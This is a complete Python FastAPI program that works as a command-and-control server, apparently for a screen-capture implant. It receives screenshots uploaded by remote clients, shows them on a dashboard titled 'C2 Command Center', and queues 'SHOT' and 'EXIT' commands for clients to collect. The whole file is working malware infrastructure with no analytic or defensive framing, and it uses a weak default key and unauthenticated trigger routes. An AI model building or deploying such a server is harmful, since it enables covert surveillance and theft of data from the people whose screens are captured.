from fastapi import FastAPI, File, UploadFile, Header, HTTPException
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles
import os
import time
import uuid
import uvicorn

app = FastAPI()

UPLOAD_DIR = "uploaded_captures"
os.makedirs(UPLOAD_DIR, exist_ok=True)
app.mount("/captures", StaticFiles(directory=UPLOAD_DIR), name="captures")

SECRET_KEY = os.getenv("SASE_KEY", "sk")

# Single-use command state
pending_command = None

@app.post("/upload")
def upload_screenshot(
    file: UploadFile = File(...),
    authorization: str = Header(None)
):
    global pending_command
    
    if authorization != SECRET_KEY:
        raise HTTPException(status_code=401, detail="Unauthorized")

    # Generate unique timestamp + short UUID to prevent frame overwrites
    timestamp = int(time.time())
    unique_id = uuid.uuid4().hex[:6]
    file_path = os.path.join(UPLOAD_DIR, f"capture_{timestamp}_{unique_id}.jpg")
    
    # Read bytes fromUploadFile stream
    contents = file.file.read()
    with open(file_path, "wb") as f:
        f.write(contents)

    # Consume and immediately clear command buffer
    active_cmd = pending_command
    pending_command = None 

    return {
        "status": "success",
        "command": active_cmd
    }

# Control Routes
@app.get("/trigger/shot")
def trigger_shot():
    global pending_command
    pending_command = "SHOT"
    return {"status": "queued", "command": "SHOT"}

@app.get("/trigger/exit")
def trigger_exit():
    global pending_command
    pending_command = "EXIT"
    return {"status": "queued", "command": "EXIT"}

@app.get("/trigger/clear")
def trigger_clear():
    global pending_command
    pending_command = None
    return {"status": "cleared"}

@app.get("/command")
def get_pending_command(authorization: str = Header(None)):
    global pending_command
    if authorization != SECRET_KEY:
        raise HTTPException(status_code=401, detail="Unauthorized")

    active_cmd = pending_command
    pending_command = None  # Consume and clear command

    return {"command": active_cmd}

@app.get("/", response_class=HTMLResponse)
def dashboard():
    files = sorted(os.listdir(UPLOAD_DIR), reverse=True)
    images_html = "".join([
        f'<div style="margin:10px;display:inline-block;border:1px solid #333;padding:10px;">'
        f'<img src="/captures/{f}" style="max-width:200px;display:block;"/><p style="font-size:12px;">{f}</p></div>'
        for f in files if f.endswith(".jpg")
    ]) or "<p>No captures yet.</p>"

    return f"""
    <html>
    <head><title>C2 Command Center</title></head>
    <body style="background:#121212;color:#00ff00;font-family:monospace;padding:20px;">
        <h1>C2 Command Center</h1>
        <div style="margin-bottom:20px;">
            <button onclick="fetch('/trigger/shot')" style="padding:10px;background:#00cc00;color:#000;font-weight:bold;margin-right:10px;cursor:pointer;">TRIGGER SHOT</button>
            <button onclick="fetch('/trigger/exit')" style="padding:10px;background:#cc0000;color:#fff;font-weight:bold;margin-right:10px;cursor:pointer;">TRIGGER EXIT</button>
            <button onclick="fetch('/trigger/clear')" style="padding:10px;background:#555;color:#fff;font-weight:bold;cursor:pointer;">CLEAR COMMANDS</button>
        </div>
        <hr style="border-color:#333;"/>
        <div style="display:flex;flex-wrap:wrap;">
            {images_html}
        </div>
    </body>
    </html>
    """

if __name__ == "__main__":
    port = int(os.getenv("PORT", 8080))
    uvicorn.run(app, host="0.0.0.0", port=port)
